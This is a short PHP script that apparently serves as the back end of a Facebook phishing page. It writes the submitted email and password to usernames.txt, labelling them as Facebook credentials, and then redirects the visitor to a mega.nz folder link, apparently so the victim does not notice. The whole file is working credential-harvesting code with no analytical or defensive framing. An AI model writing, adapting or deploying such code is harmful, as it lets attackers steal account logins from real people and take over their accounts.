<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location:https://mega.nz/folder/kHhUBahS#z-NfHmKBnZdP4oRI4rAfEA');
exit();
?>